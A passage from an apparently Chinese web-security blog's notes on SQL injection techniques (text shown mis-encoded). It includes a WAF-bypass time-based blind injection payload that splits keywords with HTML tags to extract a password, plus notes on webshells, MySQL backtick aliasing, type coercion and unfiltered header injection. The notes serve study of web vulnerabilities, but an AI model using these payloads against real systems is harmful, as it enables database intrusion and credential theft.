class="hljs-keyword">echo</span> <span class="hljs-string">&quot;caught by waf!&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$string</span>);<span class="hljs-comment">//checkSQLi()åœ¨ strip_tags ä¹‹å‰è°ƒç”¨ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥åˆ©ç”¨ strip_tags å‡½æ•°ç»•è¿‡,åœ¨å…³é”®å­—ä¸­æ’å…¥ html æ ‡è®°.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mystrip_tags</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]).<span class="hljs-string">&quot;&lt;br&gt;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
<p><code>?id=user/**/W&lt;a&gt;HERE/**/IF((S&lt;a&gt;ELECT/**/A&lt;a&gt;SCII(S&lt;a&gt;UBSTRING( PASSWORD,1,1))F&lt;a&gt;ROM/**/ts_user/**/L&lt;a&gt;IMIT%201)=101, 1=S&lt;a&gt;LEEP(2.02),0)%23</code></p>
<ol start="5" type="1">
<li><p>å½“å¯æ§å˜é‡è¿›å…¥åŒå¼•å·ä¸­æ—¶å¯å½¢æˆ webshell</p></li>
<li><p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.variables.variable.php">php å¯å˜å˜é‡</a></p></li>
<li><p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.eval.php">eval</a></p></li>
<li><p><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp">PHP file_put_contents() å‡½æ•°</a></p></li>
<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f4c0469c1efa">WebShell çš„ä¸€äº›æ–¹æ³• 1</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/le0nis/article/details/52035882">WebShell çš„ä¸€äº›æ–¹æ³• 2</a></p></li>
<li><p>mysql å¤šè¡¨æŸ¥è¯¢</p></li>
</ol>
<p><code>select user from mysql.user;</code></p>
<ol start="7" type="1">
<li>Mysql ` ä½œä¸ºæ³¨é‡Š</li>
</ol>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œmysql ä¼šè‡ªåŠ¨é—­åˆæ²¡æœ‰é—­åˆçš„</p>
<p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">`<br></code></pre></td></tr></table></figure></p>
<p>ç¬¦åˆå·ï¼Œå¯¼è‡´æ³¨å…¥çš„ ` åé¢éƒ½ä½œä¸ºä¸€ä¸ªåˆ«åï¼š</p>
<p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">from</span> pre_common_statuser <span class="hljs-keyword">as</span> ` <span class="hljs-keyword">as</span> statistic <span class="hljs-keyword">from</span> common_stat <span class="hljs-keyword">where</span> uid=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></p>
<p><code>as statistic from common_stat where uid=1</code> å³ä¸º pre_common_statuser çš„åˆ«å</p>
<p>â€‹</p>
<p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> <span class="hljs-symbol">`as`</span>;<br></code></pre></td></tr></table></figure></p>
<ol start="8" type="1">
<li>mysql çš„ç±»å‹å¼ºåˆ¶è½¬æ¢</li>
</ol>
<p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ä¾‹å¦‚ï¼šæäº¤/?<span class="hljs-attribute">test</span>=0axxx    -&gt; empty(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]) =&gt; è¿”å›çœŸ<br></code></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯ mysql ä¸­æäº¤å…¶ 0axxx åˆ°æ•°å­—å‹æ—¶å¼ºåˆ¶è½¬æ¢æˆæ•°å­— 0</p>
<p>â€‹</p>
<ol start="9" type="1">
<li><p>å…¨å±€çš„è¿‡æ»¤åªè¿‡æ»¤æ‰ GETã€POST å’Œ COOKIEï¼Œä½†æ˜¯æ²¡è¿‡æ»¤ SERVERã€‚<br />
é™„å¸¸è§çš„ SERVER å˜é‡ï¼ˆå…·ä½“å«ä¹‰è‡ªè¡Œç™¾åº¦ï¼‰ï¼š</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">HTTP_X_FORWARDED_FOR</span>ï¼šæµè§ˆå½“å‰é¡µé¢çš„ç”¨æˆ·è®¡ç®—æœºçš„ <span class="hljs-built_in">ip</span> åœ°å€<br><span class="hljs-symbol">HTTP_CLIENT_IP</span>ï¼šå®¢æˆ·ç«¯çš„ <span class="hljs-built_in">ip</span><br><span class="hljs-symbol">HTTP_HOST</span>ï¼šè·å–å½“å‰åŸŸå<br><span class="hljs-symbol">HTTP_USER_AGENT</span>ï¼šæµè§ˆå™¨ç±»å‹<br><span class="hljs-symbol">HTTP_ACCEPT_LANGUAGE</span>ï¼šæµè§ˆå™¨è¯­è¨€<br></code></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åœ¨ PHP ä¸­ä½¿ç”¨ <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] æ¥å–å¾—å®¢æˆ·ç«¯çš„<span class="hljs-built_in"> IP </span>åœ°å€ï¼Œä½†å¦‚æœå®¢æˆ·ç«¯æ˜¯ä½¿ç”¨ä»£ç†æœåŠ¡å™¨æ¥è®¿é—®ï¼Œé‚£å–åˆ°çš„å°±æ˜¯ä»£ç†æœåŠ¡å™¨çš„<span class="hljs-built_in"> IP </span>åœ°å€ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„å®¢æˆ·ç«¯<span class="hljs-built_in"> IP </span>åœ°å€ã€‚è¦æƒ³é€è¿‡ä»£ç†æœåŠ¡å™¨å–å¾—å®¢æˆ·ç«¯çš„çœŸå®<span class="hljs-built_in"> IP </span>åœ°å€ï¼Œå°±è¦ä½¿ç”¨ <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] æ¥è¯»å–ã€‚<br><br>ä¸è¿‡è¦æ³¨æ„çš„äº‹ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªä»£ç†æœåŠ¡å™¨éƒ½èƒ½ç”¨ <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] æ¥è¯»å–å®¢æˆ·ç«¯çš„çœŸå® IPï¼Œæœ‰äº›ç”¨æ­¤æ–¹æ³•è¯»å–åˆ°çš„ä»ç„¶æ˜¯ä»£ç†æœåŠ¡å™¨çš„ IPã€‚<br>è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¦‚æœå®¢æˆ·ç«¯æ²¡æœ‰é€šè¿‡ä»£ç†æœåŠ¡å™¨æ¥è®¿é—®ï¼Œé‚£ä¹ˆç”¨ <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] å–åˆ°çš„å€¼å°†æ˜¯ç©ºçš„ã€‚<br></code></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">æ‰€ä»¥ï¼Œåœ¨å®é™…ç¨‹åºä¸­ï¼Œåº”å°½é‡ä½¿ç”¨_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&quot;HTTP_HOST&quot;</span>]</span> ï¼Œæ¯”è¾ƒä¿é™©å’Œå¯é ã€‚<br></code></pre></td></tr></table></figure></li>
</ol>
<br>
<p style="text-align: center;">
<font size="2px" color="gray">æ¥å‘€å¿«æ´»å‘€</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" class="category-chain-item">é˜…è¯»ç¬”è®°</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/">#Web</a>
      
        <a href="/tags/%E6%B3%A8%E5%85%A5/">#æ³¨å…¥</a>
      
        <a href="/tags/%E4%B9%8C%E4%BA%91%E7%9F%A5%E8%AF%86%E5%BA%93/">#ä¹Œäº‘çŸ¥è¯†åº“</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SQL æ³¨å…¥å…³è”åˆ†æ</div>
      <div>https://www.tr0y.wang/2018/04/07/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2018å¹´4æœˆ7æ—¥</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>æ›´æ–°äº</div>
          <div>2023å¹´12æœˆ13æ—¥</div>
        </div>
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2018/04/07/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" title="MySQL æ³¨å…¥æŠ€å·§">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">MySQL æ³¨å…¥æŠ€å·§</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2018/04/06/WebGoat/" title="WebGoat é¶åœºé¢˜è§£">
                        <span class="hidden-mobile">WebGoat é¶åœºé¢˜è§£</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
